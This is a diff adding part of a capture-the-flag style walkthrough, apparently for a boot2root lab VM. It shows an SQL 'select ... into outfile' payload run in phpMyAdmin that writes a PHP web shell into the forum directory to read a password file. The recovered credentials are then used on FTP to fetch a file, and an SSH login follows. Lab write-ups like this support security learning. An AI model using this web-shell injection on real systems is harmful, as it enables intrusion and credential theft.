@@ -1,0 +1,46 @@
+
+## ROOT DB
+
+-   After some research on the web we stumble on this  [article](http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)
+-   The injection sql we are looking for is:  `select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output ?>" into outfile "/var/www/forum/templates_c/endTest0.php"`
+-   Copy past this line and go to to =>  [https://[IP_ADDRESS]/phpmyadmin/index.php](https://10.12.1.150/phpmyadmin/index.php)  on the sql tab
+-   After this step your just need to go to  [https://[IP_ADDRESS]/forum/templates_c/endTest0.php](https://10.12.1.150/forum/templates_c/endTest0.php)
+-   You will find  `lmezard:G!@M6f4Eatau{sF"`
+-   Login:  `lmezard`
+-   Password:  `G!@M6f4Eatau{sF"`
+
+### Use the credentials
+
+-   Now we got the password of the server, we can try to log on the FTP service
+-   ftp \[YOUR-IP-ADDRESS\]
+-   login with  `lmezard`  `G!@M6f4Eatau{sF"`
+-   get the fun file, see example bellow:
+
+```
+ftp> ls
+229 Entering Extended Passive Mode (|||25027|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> get fun
+local: fun remote: fun
+229 Entering Extended Passive Mode (|||7488|).
+150 Opening BINARY mode data connection for fun (808960 bytes).
+100% |****************************************************************************************************************************************|   790 KiB  127.07 MiB/s    00:00 ETA
+226 Transfer complete.
+808960 bytes received in 00:00 (120.03 MiB/s)
+ftp> ls
+229 Entering Extended Passive Mode (|||44244|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp>
+```
+### Using the fun file
+
+-   Refer to writeup1, step 2
+-   ssh login: laurie / 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+## SSH Connection
